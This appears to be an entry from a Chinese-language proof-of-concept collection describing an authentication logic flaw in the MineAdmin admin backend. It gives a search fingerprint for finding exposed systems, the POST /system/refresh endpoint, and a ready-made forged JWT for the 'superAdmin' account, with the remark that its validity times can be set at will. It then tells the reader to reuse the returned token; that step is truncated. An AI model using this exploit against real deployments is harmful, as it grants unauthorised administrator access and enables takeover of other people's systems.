# MineAdmin企业级后台管理系统逻辑缺陷漏洞

- **系统**：MineAdmin　|　**类型**：逻辑缺陷　|　**CVE**：—
- **指纹**：`body="MineAdmin"`
- **请求**：`POST /system/refresh HTTP/1.1`

**请求体 / payload**
```
POC/EXP：构造的jwt（次处可任意构造生效及过期时间）
Host:
Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJqdGkiOiJkZWZhdWx0XzY5NWM2MTVhOGI0YzY2LjkyMzg1MzE1IiwiaWF0IjoxNzY3NjYxOTE0LjU3MDU5MSwibmJmIjoxNzY3NjYxOTE0LjU3MDU5MSwiZXhwIjoxNzcwMjUzOTE0LjU3MDU5MSwiaWQiOjEsInVzZXJuYW1lIjoic3VwZXJBZG1pbiIsInVzZXJfdHlwZSI6IjEwMCIsIm5pY2tuYW1lIjoi5Yib5aeL5Lq6IiwiY3JlYXRlZF9hdCI6IjIwMjUtMDctMDIgMTM6Mzg6NDEiLCJ1cGRhdGVkX2F0IjoiMjAyNi0wMS0wNiAxNzoxNDowMCIsInJlbWFyayI6bnVsbCwiand0X3NjZW5lIjoiZGVmYXVsdCJ9.I2U0hOY91omT0Dh1K6Wibnx04D2fv03Pb1MWX9CRXdI
Content-Type: application/json;charset=UTF-8
POC/EXP：复制响应包的token，并发起请求查…（脚本共 624 字，完整版见原文）
```
- **预期**：200　|　—